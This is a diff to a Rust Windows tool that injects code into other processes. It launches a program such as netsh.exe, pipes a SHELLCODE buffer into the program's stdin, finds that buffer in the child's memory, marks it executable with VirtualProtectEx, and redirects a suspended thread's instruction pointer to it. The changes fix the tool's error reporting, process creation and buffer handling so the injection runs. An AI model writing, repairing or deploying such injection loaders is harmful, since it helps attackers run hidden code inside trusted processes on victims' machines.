@@ -1,19 +1,16 @@
 use std::{
     io::{self, BufRead},
-    mem::zeroed,
-    net::Shutdown::Write,
-    os::raw::{c_uint, c_void},
+    mem::{size_of, zeroed},
+    os::raw::c_void,
+    os::windows::ffi::OsStrExt,
     ptr::null_mut,
 };
 
 use windows_sys::{
-    Wdk::System::Threading::{
-        NtQueryInformationThread, ProcessWin32kSyscallFilterInformation,
-        ThreadQuerySetWin32StartAddress,
-    },
+    Wdk::System::Threading::{NtQueryInformationThread, ThreadQuerySetWin32StartAddress},
     Win32::{
         Foundation::{
-            CloseHandle, ERROR_PRINTER_DRIVER_BLOCKED, HANDLE_FLAG_INHERIT, INVALID_HANDLE_VALUE,
+            CloseHandle, GetLastError, HANDLE_FLAG_INHERIT, INVALID_HANDLE_VALUE,
             SetHandleInformation,
         },
         Security::SECURITY_ATTRIBUTES,
@@ -21,8 +18,8 @@ use windows_sys::{
         System::{
             Diagnostics::{
                 Debug::{
-                    CONTEXT, CONTEXT_CONTROL_AMD64, EX_PROP_INFO_LOCKBYTES, GetThreadContext,
-                    ReadProcessMemory, SetThreadContext, WriteProcessMemory,
+                    CONTEXT, CONTEXT_CONTROL_AMD64, GetThreadContext, ReadProcessMemory,
+                    SetThreadContext,
                 },
                 ToolHelp::{
                     CreateToolhelp32Snapshot, MODULEENTRY32W, Module32FirstW, TH32CS_SNAPMODULE,
@@ -38,11 +35,10 @@ use windows_sys::{
             Pipes::{CreatePipe, PeekNamedPipe},
             SystemInformation::{GetNativeSystemInfo, SYSTEM_INFO},
             Threading::{
-                CREATE_NEW_CONSOLE, CreateProcessA, CreateProcessW, OpenThread,
-                PROCESS_INFORMATION, ResumeThread, STARTF_USESHOWWINDOW, STARTF_USESTDHANDLES,
-                STARTUPINFOA, STARTUPINFOW, Sleep, SuspendThread, THREAD_GET_CONTEXT,
-                THREAD_QUERY_INFORMATION, THREAD_QUERY_LIMITED_INFORMATION, THREAD_SET_CONTEXT,
-                THREAD_SUSPEND_RESUME,
+                CREATE_NEW_CONSOLE, CreateProcessW, OpenThread, PROCESS_INFORMATION, ResumeThread,
+                STARTF_USESHOWWINDOW, STARTF_USESTDHANDLES, STARTUPINFOW, Sleep, SuspendThread,
+                THREAD_GET_CONTEXT, THREAD_QUERY_INFORMATION, THREAD_QUERY_LIMITED_INFORMATION,
+                THREAD_SET_CONTEXT, THREAD_SUSPEND_RESUME,
             },
         },
         UI::WindowsAndMessaging::SW_SHOW,
@@ -69,7 +65,11 @@ fn read_from_pipe(h_pipe_read: *mut c_void) -> String {
             null_mut(),
         ) == 0
         {
-            println!("[-] PeekNamedPipe failed: {}", ERROR_PRINTER_DRIVER_BLOCKED);
+            println!("[-] PeekNamedPipe failed: {}", GetLastError());
+            return String::new();
+        }
+
+        if bytes_available == 0 {
             return String::new();
         }
 
@@ -77,18 +77,18 @@ fn read_from_pipe(h_pipe_read: *mut c_void) -> String {
         let mut bytes_read: u32 = 0;
         if ReadFile(
             h_pipe_read,
-            &mut buffer as *mut _ as *mut u8,
+            buffer.as_mut_ptr() as *mut u8,
             bytes_available,
             &mut bytes_read,
             null_mut(),
         ) == 0
-            && bytes_available <= 0
+            && bytes_read == 0
         {
-            println!("[-] ReadFile failed: {}", ERROR_PRINTER_DRIVER_BLOCKED);
+            println!("[-] ReadFile failed: {}", GetLastError());
             return String::new();
         }
 
-        return String::from_utf8_lossy(&buffer).to_string();
+        String::from_utf8_lossy(&buffer[..bytes_read as usize]).to_string()
     }
 }
 
@@ -104,10 +104,10 @@ fn write_to_pipe(h_pipe_write: *mut c_void, command: &str) -> bool {
         );
 
         if result == 0 {
-            println!("[-] WriteFile failed: {}", ERROR_PRINTER_DRIVER_BLOCKED);
+            println!("[-] WriteFile failed: {}", GetLastError());
             return false;
         }
-        return true;
+        true
     }
 }
 
@@ -123,10 +123,10 @@ fn write_to_pipe_bin(h_pipe_write: *mut c_void, buffer: &[u8], size: usize) -> b
         );
 
         if result == 0 {
-            println!("[-] WriteFile failed: {}", ERROR_PRINTER_DRIVER_BLOCKED);
+            println!("[-] WriteFile failed: {}", GetLastError());
             return false;
         }
-        return true;
+        true
     }
 }
 
@@ -298,12 +298,12 @@ fn hijack_thread_rip(tid: u32, new_rip: u64, resume_after: bool) -> bool {
             tid,
         );
         if ht.is_null() {
-            println!("[-] OpenThread failed: {}", ERROR_PRINTER_DRIVER_BLOCKED);
+            println!("[-] OpenThread failed: {}", GetLastError());
             return false;
         }
 
         if SuspendThread(ht) == u32::MAX {
-            println!("[-] SuspendThread failed: {}", ERROR_PRINTER_DRIVER_BLOCKED);
+            println!("[-] SuspendThread failed: {}", GetLastError());
             CloseHandle(ht);
             return false;
         }
@@ -313,10 +313,7 @@ fn hijack_thread_rip(tid: u32, new_rip: u64, resume_after: bool) -> bool {
         ctx.ContextFlags = CONTEXT_CONTROL_AMD64;
 
         if GetThreadContext(ht, ctx as *mut CONTEXT) == 0 {
-            println!(
-                "[-] GetThreadContext failed: {}",
-                ERROR_PRINTER_DRIVER_BLOCKED
-            );
+            println!("[-] GetThreadContext failed: {}", GetLastError());
             ResumeThread(ht);
             CloseHandle(ht);
             return false;
@@ -330,10 +327,7 @@ fn hijack_thread_rip(tid: u32, new_rip: u64, resume_after: bool) -> bool {
         ctx.Rip = new_rip;
 
         if SetThreadContext(ht, ctx as *const CONTEXT) == 0 {
-            println!(
-                "[-] SetThreadContext failed: {}",
-                ERROR_PRINTER_DRIVER_BLOCKED
-            );
+            println!("[-] SetThreadContext failed: {}", GetLastError());
             ResumeThread(ht);
             CloseHandle(ht);
             return false;
@@ -342,7 +336,7 @@ fn hijack_thread_rip(tid: u32, new_rip: u64, resume_after: bool) -> bool {
 
         if resume_after {
             if ResumeThread(ht) == u32::MAX {
-                println!("[-] ResumeThread failed: {}", ERROR_PRINTER_DRIVER_BLOCKED);
+                println!("[-] ResumeThread failed: {}", GetLastError());
             } else {
                 println!("[+] Thread {} resumed", tid);
             }
@@ -356,13 +350,19 @@ fn main() {
     let args = std::env::args().collect::<Vec<String>>();
 
     if args.len() < 2 {
-        println!("Usage: {} C:\\Windows\\System32\\netsh.exe", args[0]);
+        println!("Usage: {} <executable_path>", args[0]);
+        println!("Example: {} C:\\Windows\\System32\\netsh.exe", args[0]);
         return;
     }
 
     let proc_name = &args[1];
+    let mut proc_name_w: Vec<u16> = std::ffi::OsStr::new(proc_name)
+        .encode_wide()
+        .chain(std::iter::once(0))
+        .collect();
 
-    println!("[+] Launching {}...", proc_name);
+    println!("[+] Launching: {}\n", proc_name);
+
     unsafe {
         let mut h_child_in_rd: *mut c_void = null_mut();
         let mut h_child_in_wr: *mut c_void = null_mut();
@@ -370,35 +370,35 @@ fn main() {
         let mut h_child_out_wr: *mut c_void = null_mut();
 
         let mut sa = zeroed::<SECURITY_ATTRIBUTES>();
-        sa.nLength = std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32;
+        sa.nLength = size_of::<SECURITY_ATTRIBUTES>() as u32;
         sa.bInheritHandle = 1;
         sa.lpSecurityDescriptor = null_mut();
 
-        if CreatePipe(&mut h_child_out_rd, &mut h_child_out_wr, &mut sa, 0) == 0 {
-            println!("[-] CreatePipe failed: {}", ERROR_PRINTER_DRIVER_BLOCKED);
+        if CreatePipe(&mut h_child_out_rd, &mut h_child_out_wr, &sa, 0) == 0 {
+            println!("[-] CreatePipe failed: {}", GetLastError());
             return;
         }
         SetHandleInformation(h_child_out_rd, HANDLE_FLAG_INHERIT, 0);
 
-        if CreatePipe(&mut h_child_in_rd, &mut h_child_in_wr, &mut sa, 0) == 0 {
-            println!("[-] CreatePipe failed: {}", ERROR_PRINTER_DRIVER_BLOCKED);
+        if CreatePipe(&mut h_child_in_rd, &mut h_child_in_wr, &sa, 0) == 0 {
+            println!("[-] CreatePipe failed: {}", GetLastError());
             return;
         }
         SetHandleInformation(h_child_in_wr, HANDLE_FLAG_INHERIT, 0);
 
-        let mut si = zeroed::<STARTUPINFOA>();
+        let mut si = zeroed::<STARTUPINFOW>();
         let mut pi = zeroed::<PROCESS_INFORMATION>();
 
-        si.cb = size_of::<STARTUPINFOA>() as u32;
-        si.hStdInput = h_child_in_rd as *mut c_void;
-        si.hStdOutput = h_child_out_wr as *mut c_void;
-        si.hStdError = h_child_out_wr as *mut c_void;
+        si.cb = size_of::<STARTUPINFOW>() as u32;
+        si.hStdInput = h_child_in_rd;
+        si.hStdOutput = h_child_out_wr;
+        si.hStdError = h_child_out_wr;
         si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
         si.wShowWindow = SW_SHOW as u16;
 
-        if CreateProcessA(
+        if CreateProcessW(
             null_mut(),
-            proc_name.as_ptr() as *mut u8,
+            proc_name_w.as_mut_ptr(),
             null_mut(),
             null_mut(),
             1,
@@ -409,16 +409,14 @@ fn main() {
             &mut pi,
         ) == 0
         {
-            println!(
-                "[-] CreateProcessW failed: {}",
-                ERROR_PRINTER_DRIVER_BLOCKED
-            );
+            println!("[-] CreateProcessW failed: {}", GetLastError());
+            return;
         }
 
         CloseHandle(h_child_out_wr);
         CloseHandle(h_child_in_rd);
 
-        Sleep(20);
+        Sleep(200);
 
         write_to_pipe_bin(h_child_in_wr, SHELLCODE, SHELLCODE_SIZE);
 
@@ -441,7 +439,7 @@ fn main() {
 
         if result != 0 {
             println!("[+] Found at remote address: 0x{:X}", result);
-            let size = raw_data.len();
+            let size = SHELLCODE_SIZE;
             let new_protect = PAGE_EXECUTE_READWRITE;
 
             let mut mbi = zeroed::<MEMORY_BASIC_INFORMATION>();
@@ -464,7 +462,7 @@ fn main() {
             } else {
                 println!(
                     "[-] VirtualQueryEx failed (continuing anyway): {}",
-                    ERROR_PRINTER_DRIVER_BLOCKED
+                    GetLastError()
                 );
             }
 
@@ -478,10 +476,7 @@ fn main() {
                 &mut got,
             ) == 0
             {
-                println!(
-                    "[-] ReadProcessMemory failed: {}",
-                    ERROR_PRINTER_DRIVER_BLOCKED
-                );
+                println!("[-] ReadProcessMemory failed: {}", GetLastError());
                 CloseHandle(pi.hProcess);
                 return;
             }
@@ -490,16 +485,13 @@ fn main() {
             let mut old_prot: u32 = 0;
             if VirtualProtectEx(
                 pi.hProcess,
-                result as *mut c_void,
+                result as *const c_void,
                 size,
                 new_protect,
                 &mut old_prot,
             ) == 0
             {
-                println!(
-                    "[-] VirtualProtectEx failed: {}",
-                    ERROR_PRINTER_DRIVER_BLOCKED
-                );
+                println!("[-] VirtualProtectEx failed: {}", GetLastError());
                 CloseHandle(pi.hProcess);
                 return;
             }
@@ -531,7 +523,7 @@ fn main() {
             println!("Pattern not found.");
         }
 
-        println!("\n[+] Press Enter to exit...");
+        println!("\n[+] Press Enter to exit and trigger child thread...");
         let _ = io::stdin().lock().read_line(&mut String::new());
 
         CloseHandle(pi.hProcess);
